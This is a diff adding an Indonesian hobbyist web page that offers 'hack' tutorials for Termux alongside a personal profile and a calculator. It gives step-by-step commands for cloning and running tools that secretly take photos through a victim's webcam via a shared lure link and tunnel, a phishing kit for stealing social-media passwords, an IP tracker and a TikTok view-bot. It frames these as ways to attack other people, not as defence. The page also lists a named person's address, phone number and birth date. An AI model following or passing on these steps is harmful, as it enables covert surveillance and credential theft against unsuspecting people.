@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bang Hamzah</title>
+    <style type="text/css" media="all">
+    /*sesrip*/
+* {
+         margin: 0;
+         padding: 0;
+         box-sizing: border-box;
+         font-family: 'Open Sans', sans-serif;
+}
+.data{
+         background-color:#2b2b2b ;
+         height: 860px;
+}
+    
+.navbar{
+	      background:rgb(0,0,0);
+      	margin: 0;
+      	padding: 22px 30px;
+      
+}
+ 
+.logo{
+      	font-size: 14pt;
+      	font-weight: bold;
+      	text-decoration: none;
+      	color: white;
+}
+ 
+.container{
+      	display: flex;
+      	justify-content: space-between;
+      	align-items: center;
+      	
+      	
+}
+ 
+.tombol{
+      	display: none;
+      	color: white;
+      	font-size: 14pt;			
+}
+ 
+.tombol:hover{
+      	cursor: pointer;
+}
+ 
+.menu{
+       	margin: 0;
+      	display: flex;
+      	list-style: none;
+      	padding: 0;	
+}
+ 
+.menu li{
+      	padding-left: 0;
+      	margin-right: 10px;
+}
+ 
+.menu li a{
+        background-color:#000000ab;
+        border-radius:50px;
+      	padding:10px;
+      	color:#c71111ab;
+      	text-decoration: none;
+	      display: inline-block;
+      	color:#ffffff;
+}
+
+.menu h1{
+        background-color:#ffffffab;
+        font-size:200;
+        border-radius:50px;
+        color:#cb0000;
+}
+
+@media screen and (max-width: 768px) {
+.menu {
+    		display: none;
+	}
+ 
+	.menu.aktif{
+    		display:inline-block;
+    		position: absolute;
+    		top: 120px;
+    		background-color:rgba(83,83,83,0.671, 0.2);
+    		border-radius: 22px;
+    		padding: 10px 20px;
+    		right: 0;
+    		left: 0;
+    		backdrop-filter: blur(51px);
+	    	-webkit-backdrop-filter: blur(10px);
+}
+	
+ 
+.menu.aktif li a{
+	    	padding: 10px;
+	     	display: inline-block !important;
+	}
+ 
+.tombol {
+	    	display: block;
+	}
+}
+
+
+    /* Navigation */ 
+.well{
+       color: red;
+       font-size: 20px;
+}
+.well span{
+      color: #ffffff;
+      font-size: 30px;
+    }
+    
+    
+    
+ span{
+     color:red;
+  }
+
+.menu h1{
+     text-align: center;
+     color: #fff;
+}
+.menuh h1{
+     background-color:#a00000ac;
+     color:#f40f0f;
+     padding:8px;
+}
+.Babhalaman{
+     height: 500px;
+}
+.container1{
+     background-color:#fff;
+     color:#ffffff94;
+     height: auto;
+     padding: 15px;
+}
+
+h3{
+     text-align:center;
+}
+
+.Runing{
+     color:#ffffff94;
+}
+
+.bab p{
+     color: #000000;
+}
+.bab h4{
+     color:#000000 ;
+     padding: 15px;
+}
+
+.menu1 li{
+     padding-left: 0;
+  	 margin-right: 10px;
+}
+ .menu1 li a{
+     border-radius:50px;
+   	padding:10px;
+	  text-decoration: none;
+	  display: inline-block;
+	  color:#ffffff;
+ }
+ 
+ .termux p{
+    padding: 6px;
+ }
+ 
+ .Ipt h2{
+   color: #b30000;
+   text-align: center;
+ }
+ 
+ .Ipt h3{
+   color: #000;
+   text-align: center;
+ }
+ 
+ .kode h5{
+   color: #000;
+ }
+ 
+ .ban9{
+   background-color:#2f3138;
+ }
+ 
+ .baba1{
+  padding: 10px;
+ }
+.baba2{
+  background-color:#000000;
+  height: 500px;
+}
+.menuh{
+  background-color:#a00000ac;
+}
+
+.menu h1{
+  color:#1e00a0ac;
+  font-size:25px;
+  padding:15px;
+}
+.aman h10{
+  color:#2108ca;
+}
+.aman h10 span{
+  color:#069801;
+}
+.pilihan{
+  text-align:center;
+}
+
+.pilihan h4 span{
+  color:#fcff40;
+}
+
+.soal{
+  background-color:#000000;
+  height:300px;
+  padding:20px;
+}
+
+.sepasi{
+  background-color:#b20e0e;
+  text-align:center;
+  height;4px:
+}
+
+.tentangs li a{
+  color:#fff;
+  padding:15px
+  font-size:40;
+  display:flex;
+}
+}
+.map{
+  padding:20px;
+  background-color:#b70101;
+}
+.lokasi{
+  text-align:center;
+}
+.sepahsi{
+  text-align:center;
+}
+
+.datawewe{
+  background-color:#000000;
+  height:auto;
+  color:#fff;
+  padding:19px;
+}
+
+.list li{
+  padding: 11px;
+}
+
+/*kalulator*/
+        .calculator {
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #f02727;
+            border-radius: 5px;
+            background-color: #000000;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+        .calculator input[type="text"] {
+            width: 100%;
+            font-size: 24px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        .calculator button {
+            width: 48px;
+            height: 48px;
+            font-size: 18px;
+            margin-right: 5px;
+            margin-bottom: 5px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007BFF;
+            color: #ffffff;
+            cursor: pointer;
+        }
+        .calculator button:hover {
+            background-color: #0056b3;
+        }
+/*kakulator*/
+.sepasiaja{
+           background-color: #000000;
+           height: 100px;
+           border-radius: 50px;
+  
+}
+.sepasiaja h1{
+  text-align: center;
+  padding: 14px;
+}
+
+.gifgif img{
+
+}
+
+.position{
+  position: fixed;
+  width: 100%;
+}
+.logohh{
+  background-color: red;
+  height: 69px;
+}
+.logohh2{
+  background-color: blue;
+  height: 40px;
+  padding: 10px;
+  position: fixed;
+  width: 100%;
+  font-family: 'Open Sans', sans-serif;
+}
+
+.jjjjjj{
+  position: fixed;
+}
+
+.hitamm{
+  background-color:#000000;
+  height:100px;
+}
+
+/*mengetik sendiri*/
+
+.container55{
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			height: 500px; /* Tinggi halaman */
+		}
+
+h5{
+  color: #000000;
+  padding: 5px;
+}
+
+
+.giff{
+  width:30px;
+  height:30px;
+}
+/*jammmmm*/
+
+
+	
+
+@keyframes loading {
+  0%{
+    transform: translateX(-100%);
+  }
+  100%{
+    transform: translateX(0);
+  }
+}
+
+
+    </style>
+  </head>
+   <body>
+     		
+     		<!--loding-->
+            <div class="box">
+        <div class="loading">
+          <div class="loading-card">
+            <div class="loading-progres"></div>
+         </div>
+         </div>
+         </div>
+     <!--loding-->
+     
+    <div class="position">
+      
+      <nav class="navbar">
+		<div class="container">
+		  <img src="https://i.ibb.co.com/YZ7QzrD/XOsX.gif" class="giff">
+      	<a class="well">☠️Well<span>Komm</span></a>
+			<ul class="menu">
+			  <h1>☠ MenuYang<span>Tersedia</span></h1>
+			  <hr class="garis">
+				<li><a href="index.html">Home</a></li>
+				<li><a href="index1.html">Tentang</a></li>
+			</ul>
+			
+			<div class="tombol">
+				&#9776;
+			</div>
+		</div>
+	</nav>
+    </div>
+	<div class="ban9">
+	<div>
+
+
+	  <hr>
+	  <hr>
+	</div>
+	<!--menu-->
+	<div class="logohh">
+	</div>
+	<div class="logohh2">
+	  
+	<div class="pilihan">
+	  <div class="jjjjjj">
+
+	  <h4>️☠️Menu<span>Pilihan️️☠</span></h4>
+	  <hr>
+	</div>
+	  </div>
+	</div>
+  <div class="Babhalaman">
+       <ul class="menu1">
+      <li><a href="Hackame"># Hack kamera </a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># Hack lokasi</a></li>
+      <li><a href="button"># Hack fb</a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># Nambah folower ig</a></li>
+      <li><a href="naviganti"># Pishing sosial media</a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># Spam Sms</a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># Tambah view Tiktok</a></li>
+      <li><a href="Hackip"># Hack alamat ip</a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># sadap wasapa</a></li>
+      <li><a href="#" onclick="alert('belum ter sedia maff \n(hamz..')"># Hack audio</a></li>
+       </ul>
+       </div>
+       </div>
+        
+        <div>
+          	<p id="jumlah-pengunjung"></p>
+	<script>
+		var jumlah_pengunjung = 0;
+		var pengunjung = 0;
+		
+		setInterval(function() {
+			jumlah_pengunjung++;
+			pengunjung++;
+			document.getElementById("jumlah-pengunjung").innerHTML = "Jumlah pengunjung: " + jumlah_pengunjung;
+		}, 10000);
+	</script>
+        </div>
+      <hr>
+ <h3>BAHAN YANG DI PERLUKAN</h3>
+      <hr>
+      <div>
+      <div class="container1">
+      <div class="bab">
+      <p>untuk memulai peretasan kita perlu men <u>download</u> bahah bahan yang di perlukan<br></p>
+      <h4>Untuk Bahan Nya ada di bawah ini</h4>
+      <p>bahan yang di perlukan</p>
+      <div class="termux">
+      <hr>
+      <p>download <u>Termux</u></p>
+      <p><a href="https://wiki.termux.com/">•TERMUK</a></p>
+      <p>download <u>zarchiver</u></p>
+      <p><a href="https://www.zarchiver.pro/">•zarchiver</a></p>
+      <p>download <u>MT-manager</u></p>
+      <p><a href="https://apkpure.net/mt-manager/bin.mt.plus/download">•MT-manager</a></p>
+      <hr>
+      <h4>Itulah bahan yang di perlukan</h4>
+      <div>
+      <p>Setelah bahan yang di butuhkan sudah ter install <u>Buka aplikasi Termux</u></p>
+       <hr>
+       <div class="Ipt">
+       <h2> Berikut ini berbagai cara yang bisa di coba</h2>
+       <hr>
+       <h3 id="Hackip"> Hack iP-Tracker termux
+       </h3>
+       <hr>
+       <p>Oke sebelum di mulay <u>buka dulu apk temux nya</u></p>
+       <p>dan masuk kan perintah di bawah ini</p>
+       <div class="kode">
+       <p>install data termux contoh dibawah</p>
+       <h5># apt update</h5>
+       <h5># apt upgrade</h5>
+       <h5># pkg update && pkg upgrade</h5>
+       <h5># pkg install python</h5>
+       <h5># pkg install python2</h5>
+       <h5># pkg install python3</h5>
+       <h5># pkg install git</h5>
+       <h5># pip install rekuests</h5>
+       <h5># pkg install bash</h5>
+       <p>kalow udah masuk kan kode di bawah ini sapai install nya selesai</p>
+       <h5># git clone https://github.com/KasRoudra/IP-Tracker</h5>
+       <p>Kalow udah masukan kode ini </p>
+       <h5># ls</h5>
+       <p>Kalow udah masukan kode ini</p>
+       <h5># cd IP-Tracker</h5>
+       <p>Kalow udah masukan kode ini</p>
+       <h5># bash ip.sh</h5>
+       <hr>
+       <p>itulah script termux hack ip orang lain </p>
+       <p>namun belum selesai masih ada berbagai tahapan lagi </p>
+       <hr>
+       </div>
+         
+       
+       <div>
+         <section id="Hackame">
+           <div>
+            <h3>Hack kamera termux</h3>
+           </div>
+           
+       </section>
+       <hr>
+       <p>Oke sebleum di mulai seperti biasa <u>buka aplikasi termux nya</u></p>
+       <p>berikut ini adallah script termux hack <u>Kamera</u> yang bisa kamu jalan kan</p>
+       <p>buka aplikasi termux dan masuk kan script di bawah ini</p>
+       <p>Masukkan perintah ini</p>
+       <h5># pkg update && pkg upgrade</h5>
+       <p>kalow udah masuk kan yang ini</p>
+       <h5># apt install php wget git</h5>
+       <p>kalow ada pemilihan:n/y = pilih, .y</p>
+       <p>kalow udah masuk perintah ini</p>
+       <h5># git clone https://github.com/kinghacker0/WishFish.git</h5>
+       <p>kalow udah ketik .ls</p>
+       <h5># ls</h5>
+       <p>kalow udah ketik ini</p>
+       <h5># cd WishFish</h5>
+       <p>lalu ketik .ls</p>
+       <h5># ls</h5>
+       <p>kalow udah ketik..</p>
+       <h5># bash wishfish.sh</h5>
+       <p>kalow udah nan ti akan ada pilihan contoh<br>
+       [01]Ngrok..<br>
+       [02]Serveo.net</p>
+       <p>maka pilih nomor 2</p>
+       <p>kalou udah daptar ngrok pilih aja angka 1</p>
+       <p>setlah itu akan mun cul kembali pilihan<br>
+       contoh<br>
+       [01] Festival Wishing<br>
+       [02] Live Youtube TV<br>
+       [03] Online Meeting</p><br>
+       <p>pilih aja yang nomor .1</p>
+       <p>Masukkan nama festival: bebas</p>
+       <p>Choose subdomain? (Default: [Y/n] ): pilih y</p>
+       <p>Subdomain: (Default: hey!31470 ): 3333</p>
+       <p>setelah itu buat halaman baru dengan cara geser sisi kiri atas termux</p>
+       <p>masukkan kode ini</p>
+       <h5># ssh -R 80:localhost:3333 nokey@localhost.run</h5>
+       <p>nanti akan keluar link dan bagikan link ter sebut ke pada orang lain <br>
+       kalou orang lain meng buka nya maka akan oto matis ke ambil poto nyaa</p>
+       <p>kalow udah ketik <br>
+       ctrl c <br>
+       kalow udah masuk kan perintah</p>
+       <h5># mv * /data/data/com.termux/files/home/storage/shared</h5>
+       <p>buka porder hp kamu maka si poto nya ada di situ</p>
+       <p>maka cara nya selesai</p>
+       <hr>
+       <hr>
+       <h3>fishing Sosial media</h3>
+       <hr>
+       <hr>
+       <p>oke seperti biasa sebelum di mulai tutorial nya <u>buka dulu termux Nyaa</u></p>
+       <p text="center">.pen jelasa fishing Sosial media</p>
+       <p>fishing sosial media itu dengan cara membagikan link tipuan seperti kuota geratis login fb login tiktok dan <u>lain lain</u></p>
+       <p>nanti kamu harus membuat link tautan tipuan<br>
+       dan harus di bagikan ke orang lain dan si orang lain itu harus mem buka <br>
+       link tautan itu nanti si orang tersebut akan memasukkan password sosial media yang dia pun nya seperti fb tiktok email dan lain lain<br>
+       ok segitu aja penjelasan nya <br>
+       *kita lanjut ke tutorial nya
+       <hr>
+       
+       
+      <p>Masukkan perintah ini</p> 
+      <h5># pkg update</h5>
+      <h5># pkg upgrade</h5>
+      <h5># pkg install git wget php</h5>
+      <h5># git clone https://github.com/isuruwa/Phoenix</h5>
+      <h5># cd Phoenix</h5>
+      <h5># chmod +x setup</h5>
+      <h5># ./setup</h5>
+      <p>kalou udah masukkan kode Authtoken ngrok</p>
+      <p>untuk cara daftar ngrok </p>
+      <p>disini</p>
+      <a href="https://blog.ruangdeveloper.com/cara-mengakses-aplikasi-localhost-melalui-internet/">cara daftar ngrok</a>
+      <hr>
+      <hr>
+      <h2>cara nambah view tiktok</h2>
+      <hr>
+      <hr>
+      <p>disini saya akan membagikan cara nambah view tiktok</p>
+      <p>oke lang sung aja ke tutorial nyaa</p>
+      <p>masukkan persatu satu perintah di bawah ini</p>
+      <h5># pkg update && pkg upgrade -y</h5>
+      <h5># pkg install python</h5>
+      <h5># pkg install git</h5>
+      <h5># pkg install requests</h5>
+      <h5># pkg install bash </h5>
+      <h5># pkg install python2</h5>
+      <p>oke kalow udah download dulu zarchiver</p>
+      <p>link nya ada di atas</p>
+      <p>kalou udah download dulu script Nyaa</p>
+      <p>ini script nyaa</p>
+      
+      <a href="https://www.mediafire.com/file/tg69tulcqmhvxg1/tiktokviewv2.zip/file">script</a>
+      <p>kalau udah masuk ke aplikasi zarchiver nya</p>
+      <p>cari ::tiktokviewv2.zip</p>
+      <p>terus exstrak zip nya</p>
+      <p>kalou udah masuk lagi ke termux dan masukklan perintah ini</p>
+      <h5># cd /storage/emulated/0/Download</h5>
+      <p>ketik</p>
+      <h5>
+        # ls
+      
+      </h5>
+      <p>kalou udah ketok </p>
+      <h5># cd tiktokviewv2</h5>
+      <p>ketik lagi</p>
+      <h5># cd tiktokviewv2</h5>
+      <p>kalau udak ketik lagi </p>
+      <h5># python bot.py</h5>
+      <p>nah nantik akan di minta masukkan link vidio kalian</p>
+      <p>contoh: <br>
+      https://vt.tiktok.com/ZSY7cR4DR/</p>
+      <p>Terus enter dan selesai</p>
+       </div>
+        </div>
+       </div>
+     </div>
+     </div>
+   </div>
+   <hr>
+ </div>
+ 
+ <!--lokasi-->
+ <div class="lokasi">
+ <hr>
+ <h1>Lokasi</h1>
+ <hr>
+ </div>
+ <div class="datawewe">
+ <div class="map">
+   <nav id="naviganti">
+     
+            <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d630.022791560225!2d107.19937537561492!3d-7.474954063572611!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e67d5001828e507%3A0x847dc64328b690e3!2sWarung%20seblak%20cimol%20es%20campur!5e1!3m2!1sen!2sid!4v1721566620697!5m2!1sen!2sid" width="400" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade" padding="20px"></iframe>
+   </nav>
+ </div>
+ 
+ <hr>
+ <h4 class="sepahsi">Tentang Saya</h4>
+ <hr>
+      <div class="kotak">
+ 
+		</div>
+		<div class="blok">
+ 
+			<h2><u>Informasi</u></h2>			
+ 
+			<div class="kanan">
+				<table>
+					<tr>
+						<th>Nama</th>
+						  
+  <img src="https://feeldreams.github.io/pusn.gif" height="80px"/>
+						  
+						
+						<td>M.Hamzah</td>
+					</tr>
+					<tr>
+						<th>Tempat</th>
+						<th>:</th>
+						<td>Sindangbarang</td>
+					</tr>
+					<tr>
+						<th>Tgl.Lahir</th>
+						<th>:</th>
+						<td>11 SAgustus 2007</td>
+					</tr>
+					<tr>
+						<th>Agama</th>
+						<th>:</th>
+						<td>Islam</td>
+					</tr>
+					<tr>
+						<th>Alamat</th>
+						<th>:</th>
+						<td>Jl. Cimahi kulon, No. 50, Blok - Cimahi, kct,Sindang barang .</td>
+					</tr>
+					<tr>
+						<th>Email</th>
+						<th>:</th>
+						<td>welljom7788@gmail.com</td>
+					</tr>
+					<tr>
+						<th>No.HP</th>
+						<th>:</th>
+						<td>+6285724385372</td>
+					</tr>
+				</table>
+		   	</div>
+      	</div>		
+ 
+		  <div class="blok">
+      <hr>
+			<h2>Pendidikan</h2>			
+			
+			<div>
+				<ul>
+					<li><b>20013 - 2018</b> SD Santosa</li>
+					<li><b>2018 - 2023</b> MTSN 2 Cianjur</li>
+					<li><b>2023 - 2024</b> SMAN 1 SINDANGBARANG</li>
+				</ul>
+			</div>
+      </div>
+ 
+		<div class="blok">
+ 
+			<h2>Pengalaman Kerja</h2>
+			
+			<div>
+				<ul>
+				  <li>masih</li>
+					<li>
+						<b><i>pengang guran</i></b>
+					</li>
+				</ul>
+			</div>
+ 
+		</div>
+ 
+		<div class="blok">
+ <hr>
+			<h2>Keahlian</h2>			
+			
+			<div>
+			  
+				<ul>
+					<li>HTML</li>
+					<li>CSS</li>
+					<li>JavaScript</li>
+					<li>PHP</li>
+					<li>CodeIgniter</li>
+					<li>Laravel</li>
+				</ul>
+ 
+	</div>
+	</div>
+<hr>
+<hr>
+<div class="list">
+  <h1>Peringatan</h1>
+    <ul style="list-style-image: url(https://assets.ubuntu.com/sites/ubuntu/latest/u/img/favicon.ico)" class="list">
+        <li>Javascript</li>
+        <li>PHP</li>
+        <li>Java</li>
+        <li>Python</li>
+        <li>Kotlin</li>
+    </ul>
+</div>
+<hr>
+<div class="sepasiaja"><h1>Kakulator Bila Perlu</h1></div>
+  
+   <!--Kakulator-->
+       <div class="calculator">
+        <input type="text" id="display" readonly>
+        <button onclick="appendToDisplay('7')">7</button>
+        <button onclick="appendToDisplay('8')">8</button>
+        <button onclick="appendToDisplay('9')">9</button>
+        <button onclick="appendToDisplay('+')">+</button>
+        <button onclick="appendToDisplay('4')">4</button>
+        <button onclick="appendToDisplay('5')">5</button>
+        <button onclick="appendToDisplay('6')">6</button>
+        <button onclick="appendToDisplay('-')">-</button>
+        <button onclick="appendToDisplay('1')">1</button>
+        <button onclick="appendToDisplay('2')">2</button>
+        <button onclick="appendToDisplay('3')">3</button>
+        <button onclick="appendToDisplay('*')">*</button>
+        <button onclick="appendToDisplay('0')">0</button>
+        <button onclick="clearDisplay()">C</button>
+        <button onclick="calculateResult()">=</button>
+        <button onclick="appendToDisplay('/')">/</button>
+    </div>
+    
+      <hr>
+      <div class="gifgif">
+        
+      <img src="https://feeldreams.github.io/wortel.gif" height="100px">
+      </div>
+      <h3>Sendiri<span>Aja</span></h3>
+      <hr>
+      <hr>
+      <marquee scrolldelay="50" class="Runing">Tidak usah sedih kalau sendiri, matahari juga sendiri, tapi tetap bersinar.         ------------------------------------------Nikmati aja status kamu saat ini dan jangan iri. Karena ada orang yang bosan menjadi jomblo dan ada juga orang yang bosan saat pacaran------------------------------------------Kesendirian itu penting dia bagai udara segar untuk menghasilkan Inspirasi dan Ide baru.”</marquee>
+      <hr>
+      <div>
+        
+      <h1>Kata kata buat kamu semangat</h1>
+        <button onclick="typeWriter1()">Lihat</button>
+        <p id="typing"></p>
+      </div>
+      <div class="hitamm">
+        
+      </div>
+	<h4 t>Komentat kalian soal websit ini</h4>
+	<form>
+		<label for="nama">Nama:</label>
+		<input type="text" id="nama" name="nama"><br><br>
+		<label for="komentar">Komentar:</label>
+		<textarea id="komentar" name="komentar"></textarea><br><br>
+		<input type="submit" value="Kirim Komentar">
+	</form>
+	<ul id="komentar-orang-lain"></ul>
+	
+	
+	
+	
+	<div class="container55">
+		<img src="https://i.ibb.co.com/dtWF3Hj/dancing-3d.gif" alt="Gambar" width="300" height="200"> <!-- Ukuran gambar dapat disesuaikan -->
+	</div>
+	
+	
+	     
+      <div class="hitamm">
+        </div>
+	   </div>
+	
+	
+	
+	<script>
+		var komentar = [];
+			document.getElementById("submit").addEventListener("click", function() {
+			var nama = document.getElementById("nama").value;
+			var komentar_text = document.getElementById("komentar").value;
+			komentar.push({ nama: nama, komentar: komentar_text });
+			document.getElementById("komentar-orang-lain").innerHTML = "";
+			komentar.forEach(function(item) {
+				var li = document.createElement("li");
+				li.textContent = item.nama + ": " + item.komentar;
+				document.getElementById("komentar-orang-lain").appendChild(li);
+			});
+		});
+	</script>
+      
+      
+      
+      <script>
+        var i = 0;
+        var txt = 'Kesuksesan bukanlah tentang seberapa cepat kita sampai, melainkan seberapa kuat tekad kita untuk tidak menyerah';
+        var speed = 60;
+        function typeWriter1() {
+        if (i < txt.length) {
+        document.getElementById("typing").innerHTML += txt.charAt(i);
+       i++;
+       setTimeout(typeWriter1, speed);
+       }
+       }
+        </script>
+        
+
+        
+        
+        
+      
+    <script>
+        function appendToDisplay(value) {
+            document.getElementById('display').value += value;
+        }
+        function clearDisplay() {
+            document.getElementById('display').value = '';
+        }
+        function calculateResult() {
+            try {
+                const result = eval(document.getElementById('display').value);
+                document.getElementById('display').value = result;
+            } catch (error) {
+                document.getElementById('display').value = 'Error';
+            }
+        }
+    </script>
+    
+
+
+ 
+        <!--Navbar-->
+
+        <!--Java-->
+        
+        
+        
+        <script type="text/javascript">
+		// deklarasi tombol dan menu
+		const tombol = document.querySelector('.tombol');
+		const menu = document.querySelector('.menu');
+ 
+		// membuat event click
+		// pada saat tombol di click, tambahkan class aktif pada class menu
+		// saat diklik lagi, maka class aktif dihilangkan dari class menu (toggle)
+		tombol.addEventListener('click', () => {
+			menu.classList.toggle('aktif');
+		});
+</script>
+  </body>
+</html>
